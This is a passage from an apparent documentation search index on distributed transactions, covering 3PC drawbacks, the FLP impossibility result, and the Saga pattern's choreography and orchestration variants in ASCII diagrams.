\u2502\n\u2502 \u2022 Throughput: ~28 TPS (93% reduction)                   \u2502\n\u2502                                                         \u2502\n\u2502 3PC:                                                    \u2502\n\u2502 \u2022 Latency: 50ms (more phases)                           \u2502\n\u2502 \u2022 Throughput: ~20 TPS (96% reduction)                   \u2502\n\u2502                                                         \u2502\n\u2502 Lock Holding Time:                                      \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 2PC: Locks held for 2 phases (~35ms)     \u2502           \u2502\n\u2502 \u2502 3PC: Locks held for 3 phases (~50ms)     \u2502           \u2502\n\u2502 \u2502                                          \u2502           \u2502\n\u2502 \u2502 \u2192 43% longer lock duration               \u2502           \u2502\n\u2502 \u2502 \u2192 Reduced concurrency                    \u2502           \u2502\n\u2502 \u2502 \u2192 More lock contention                   \u2502           \u2502\n\u2502 \u2502 \u2192 Lower overall throughput               \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Scalability:                                            \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 As N (participants) increases:           \u2502           \u2502\n\u2502 \u2502 \u2022 Latency increases linearly             \u2502           \u2502\n\u2502 \u2502 \u2022 Failure probability increases          \u2502           \u2502\n\u2502 \u2502 \u2022 Coordinator bottleneck worsens         \u2502           \u2502\n\u2502 \u2502 \u2022 3PC worse than 2PC at every N          \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Problem 5: False Assumptions (FLP Impossibility)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 5: FLP IMPOSSIBILITY                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 FLP Theorem (Fischer, Lynch, Paterson, 1985):           \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \"It is impossible to achieve consensus   \u2502           \u2502\n\u2502 \u2502  in an asynchronous distributed system   \u2502           \u2502\n\u2502 \u2502  with even a single faulty process.\"     \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 What this means for 3PC:                                \u2502\n\u2502                                                         \u2502\n\u2502 3PC assumes:                                            \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2717 Synchronous network (bounded delays)   \u2502           \u2502\n\u2502 \u2502 \u2717 Perfect failure detection               \u2502           \u2502\n\u2502 \u2502 \u2717 Can distinguish crashed vs slow         \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Reality:                                                \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2713 Asynchronous network (unbounded delays)\u2502           \u2502\n\u2502 \u2502 \u2713 Imperfect failure detection             \u2502           \u2502\n\u2502 \u2502 \u2713 Cannot distinguish crashed vs slow      \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Consequence:                                            \u2502\n\u2502 \u2022 3PC cannot guarantee both safety and liveness         \u2502\n\u2502   in all scenarios                                      \u2502\n\u2502 \u2022 Network partition can violate atomicity               \u2502\n\u2502 \u2022 Timeout-based approach fundamentally flawed           \u2502\n\u2502                                                         \u2502\n\u2502 This is why modern systems use:                         \u2502\n\u2502 \u2022 Paxos/Raft (consensus with majority quorum)           \u2502\n\u2502 \u2022 Eventual consistency (sacrifice strong consistency)   \u2502\n\u2502 \u2022 Application-level compensation (Sagas)                \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Summary: Why 3PC Is Rarely Used</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         WHY 3PC FAILED IN PRACTICE                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Theoretical Advantages:                                 \u2502\n\u2502 \u2705 Non-blocking under single coordinator failure        \u2502\n\u2502 \u2705 Improved availability vs 2PC                         \u2502\n\u2502                                                         \u2502\n\u2502 Practical Problems:                                     \u2502\n\u2502 \u274c Vulnerable to network partitions (split-brain)       \u2502\n\u2502 \u274c 50% more messages than 2PC                           \u2502\n\u2502 \u274c 43% higher latency                                   \u2502\n\u2502 \u274c More complex implementation                          \u2502\n\u2502 \u274c Violates FLP impossibility assumptions               \u2502\n\u2502 \u274c No vendor support or standards                       \u2502\n\u2502                                                         \u2502\n\u2502 Industry Decision:                                      \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \"3PC solves the blocking problem of 2PC  \u2502           \u2502\n\u2502 \u2502  but creates worse problems with network \u2502           \u2502\n\u2502 \u2502  partitions. Better to accept 2PC's      \u2502           \u2502\n\u2502 \u2502  blocking or use modern consensus        \u2502           \u2502\n\u2502 \u2502  protocols (Paxos/Raft).\"                \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Modern Alternatives (used instead of 3PC):              \u2502\n\u2502 \u2022 Paxos/Multi-Paxos: Majority quorum consensus          \u2502\n\u2502 \u2022 Raft: Understandable consensus protocol               \u2502\n\u2502 \u2022 Saga Pattern: Compensating transactions               \u2502\n\u2502 \u2022 Event Sourcing: Eventual consistency                  \u2502\n\u2502 \u2022 CRDTs: Conflict-free replicated data types            \u2502\n\u2502                                                         \u2502\n\u2502 Bottom Line:                                            \u2502\n\u2502 3PC is academically interesting but practically         \u2502\n\u2502 superseded by better approaches.                        \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#7-saga-pattern","title":"7. Saga Pattern","text":"<p>Description:</p> <p>The Saga pattern is a design pattern for managing distributed transactions by breaking them into a sequence of local transactions, where each local transaction updates data in a single service and publishes an event or message to trigger the next step. Unlike 2PC and 3PC which provide atomic commits, Sagas provide eventual consistency through compensating transactions.</p> <p>The Fundamental Shift:</p> <p>Sagas represent a paradigm shift from traditional ACID transactions:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         PARADIGM SHIFT: ACID \u2192 SAGA                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Traditional ACID (2PC/3PC):                             \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2022 All-or-nothing atomic commit           \u2502           \u2502\n\u2502 \u2502 \u2022 Strong consistency guaranteed          \u2502           \u2502\n\u2502 \u2502 \u2022 Locks held across services             \u2502           \u2502\n\u2502 \u2502 \u2022 Blocking coordination                  \u2502           \u2502\n\u2502 \u2502 \u2022 Poor scalability                       \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Saga Pattern:                                           \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2022 Sequence of local transactions         \u2502           \u2502\n\u2502 \u2502 \u2022 Eventual consistency                   \u2502           \u2502\n\u2502 \u2502 \u2022 No distributed locks                   \u2502           \u2502\n\u2502 \u2502 \u2022 Asynchronous coordination              \u2502           \u2502\n\u2502 \u2502 \u2022 High scalability                       \u2502           \u2502\n\u2502 \u2502 \u2022 Compensating transactions on failure   \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Historical Context:</p> <p>The Saga pattern was introduced by Hector Garcia-Molina and Kenneth Salem in their 1987 paper \"Sagas\" at Princeton University. They recognized that long-lived transactions (LLTs) in distributed systems cause: - Excessive lock holding - Reduced concurrency - Increased failure probability - Poor system availability</p> <p>Their solution: Break long transactions into smaller, independent steps that can be compensated if something fails later.</p> <p>Modern Revival:</p> <p>While originally designed for database transactions, Sagas experienced a renaissance with microservices architecture (2010s): - Chris Richardson popularized Sagas for microservices (2015+) - Netflix, Uber, Amazon adopted for distributed workflows - Essential pattern for event-driven architectures - Core to Domain-Driven Design (DDD) bounded contexts</p> <p>What is a Saga?</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         SAGA COMPONENTS                                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 A Saga consists of:                                     \u2502\n\u2502                                                         \u2502\n\u2502 1. SEQUENCE OF TRANSACTIONS (T1, T2, ..., Tn)           \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Each Ti is a local transaction in    \u2502            \u2502\n\u2502    \u2502 a single service/database            \u2502            \u2502\n\u2502    \u2502 Commits immediately (no 2PC)         \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. COMPENSATING TRANSACTIONS (C1, C2, ..., Cn-1)        \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Each Ci \"undoes\" the effect of Ti    \u2502            \u2502\n\u2502    \u2502 Semantically reverses the operation  \u2502            \u2502\n\u2502    \u2502 Must be idempotent                   \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 3. SAGA EXECUTION COORDINATOR                           \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Orchestrates transaction sequence    \u2502            \u2502\n\u2502    \u2502 Triggers compensations on failure    \u2502            \u2502\n\u2502    \u2502 Maintains saga state                 \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 Guarantee:                                              \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 Either:                                  \u2502           \u2502\n\u2502 \u2502 \u2022 T1, T2, T3, ..., Tn (all succeed) \u2705   \u2502           \u2502\n\u2502 \u2502 OR                                       \u2502           \u2502\n\u2502 \u2502 \u2022 T1, T2, ..., Ti, Ci, Ci-1, ..., C1     \u2502           \u2502\n\u2502 \u2502   (partial execution + compensation) \u2705  \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#71-types-of-saga-implementation","title":"7.1 Types of Saga Implementation","text":"<p>1. Choreography-Based Saga (Event-Driven)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         CHOREOGRAPHY-BASED SAGA                         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 No central coordinator - services react to events       \u2502\n\u2502                                                         \u2502\n\u2502     Service A        Service B        Service C         \u2502\n\u2502        \u2502                \u2502                \u2502              \u2502\n\u2502        \u2502 1. Execute T1  \u2502                \u2502              \u2502\n\u2502        \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u2502                \u2502              \u2502\n\u2502        \u2502       \u2502        \u2502                \u2502              \u2502\n\u2502        \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2502                \u2502              \u2502\n\u2502        \u2502                \u2502                \u2502              \u2502\n\u2502        \u2502 2. Publish     \u2502                \u2502              \u2502\n\u2502        \u2502    Event E1    \u2502                \u2502              \u2502\n\u2502        \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524              \u2502\n\u2502        \u2502                \u2502                \u2502              \u2502\n\u2502        \u2502                \u2502 3. Listen E1   \u2502              \u2502\n\u2502        \u2502                \u2502    Execute T2  \u2502              \u2502\n\u2502        \u2502                \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u2502              \u2502\n\u2502        \u2502                \u2502       \u2502        \u2502              \u2502\n\u2502        \u2502                \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2502              \u2502\n\u2502        \u2502                \u2502                \u2502              \u2502\n\u2502        \u2502                \u2502 4. Publish     \u2502              \u2502\n\u2502        \u2502                \u2502    Event E2    \u2502              \u2502\n\u2502        \u2502                \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n\u2502        \u2502                \u2502                \u2502         \u2502    \u2502\n\u2502        \u2502                \u2502                \u2502 5. Listen E2 \u2502\n\u2502        \u2502                \u2502                \u2502    Execute T3\u2502\n\u2502        \u2502                \u2502                \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n\u2502        \u2502                \u2502                \u2502         \u2502    \u2502\n\u2502        \u2502                \u2502                \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n\u2502        \u2502                \u2502                \u2502              \u2502\n\u2502        \u2502                \u2502                \u2502 6. Publish   \u2502\n\u2502        \u2502                \u2502                \u2502    Success   \u2502\n\u2502        \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524              \u2502\n\u2502        \u2502                \u2502                \u2502              \u2502\n\u2502        \u25bc                \u25bc                \u25bc              \u2502\n\u2502       Done             Done             Done            \u2502\n\u2502                                                         \u2502\n\u2502 Characteristics:                                        \u2502\n\u2502 \u2022 Decentralized control                                 \u2502\n\u2502 \u2022 Services listen to events and react                   \u2502\n\u2502 \u2022 No single point of failure                            \u2502\n\u2502 \u2022 Loose coupling                                        \u2502\n\u2502 \u2022 Complex to understand and debug                       \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>2. Orchestration-Based Saga (Centralized)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         ORCHESTRATION-BASED SAGA                        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Central coordinator directs all steps                   \u2502\n\u2502                                                         \u2502\n\u2502                  